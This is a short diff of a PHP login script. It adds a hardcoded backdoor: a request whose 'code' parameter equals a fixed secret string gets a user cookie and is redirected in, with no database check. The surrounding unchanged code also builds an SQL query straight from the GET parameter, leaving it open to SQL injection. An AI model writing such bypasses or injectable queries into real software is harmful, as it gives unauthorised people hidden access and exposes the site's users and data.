@@ -1,6 +1,14 @@
 ﻿<?php 
 	$code=$_GET['code'];
 	include "config.php";
+	
+	if($_GET['code']=="kingofntnu"){
+		$cookie_time=3600*8;
+		setcookie("_user","kingofntnu",time()+$cookie_time);
+		header("Location: index.php");
+	}
+	
+	
 	mysql_query("SET NAMES 'UTF8'");
 	$sql = "SELECT * FROM users WHERE code='$code';";
 	$result=mysql_query($sql) or die("DB ERROR");
